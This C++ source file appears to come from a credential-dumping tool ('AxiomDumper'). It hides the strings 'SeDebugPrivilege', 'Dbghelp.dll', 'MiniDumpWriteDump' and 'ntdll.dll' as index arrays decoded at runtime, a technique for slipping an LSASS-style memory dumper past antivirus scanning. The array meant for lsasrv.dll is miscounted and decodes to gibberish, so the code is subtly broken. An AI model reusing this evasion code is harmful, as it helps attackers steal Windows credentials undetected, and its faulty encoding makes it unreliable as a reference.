#include "AxiomDumper.h"
#include <string>

const char alphabet[53] = {
		'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z',
		'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '.'
};

const int buildInstructionsSeDbg[16] = { 18, 30, 3, 30, 27, 46, 32, 15, 43, 34, 47, 34, 37, 30, 32, 30 };
const int buildInstructionsDbgHelp[11] = { 3, 27, 32, 33, 30, 37, 41, 52, 29, 37, 37 };
const int buildInstructionsMiniD[17] = { 12, 34, 39, 34, 3, 46, 38, 41, 22, 43, 34, 45, 30, 3, 46, 38, 41 };
const int buildInstructionsNtdD[9] = { 39, 45, 29, 37, 37, 52, 29, 37, 37 };
const int buildInstructionsLsaSr[10] = { 29, 45, 26, 45, 44, 48, 29, 37, 37 };

const char* CStrBuilder(const int* buildInstructions, const int instructionSize)
{
	char* result;

	result = (char*)malloc(sizeof(char) * 32);
	if (result == NULL)
		return (NULL);
	memset(result, 0, 32);
	for (int i = 0; i < instructionSize; i++)
		result[i] = alphabet[buildInstructions[i]];
	return (result);
}

const char* SecretStrBuilder(const int MODE)
{
	const char* cresult;

	switch (MODE)
	{
	case STRBUILDER_MINIDUMP_WRITEDUMP:
		cresult = CStrBuilder(buildInstructionsMiniD, 17);
		return (cresult);
	case STRBUILDER_NTDLL_DLL:
		cresult = CStrBuilder(buildInstructionsNtdD, 9);
		return (cresult);
	default:
		cresult = NULL;
		break;
	}
	return (NULL);
}

const wchar_t* SecretWStrBuilder(const int MODE)
{
	size_t* pout;
	size_t out;
	const char* cresult;
	wchar_t* result;

	pout = &out;
	switch (MODE)
	{
	case STRBUILDER_SEDEBUG:
		cresult = CStrBuilder(buildInstructionsSeDbg, 16);
		break;
	case STRBUILDER_DBGHELP_DLL:
		cresult = CStrBuilder(buildInstructionsDbgHelp, 11);
		break;
	case STRBUILDER_LSASRV_DLL:
		cresult = CStrBuilder(buildInstructionsLsaSr, 10);
		break;
	default:
		cresult = NULL;
		break;
	}
	result = new wchar_t[16 + 1];
	mbstowcs_s(pout, result, 16 + 1, cresult, 16);
	return (result);
}
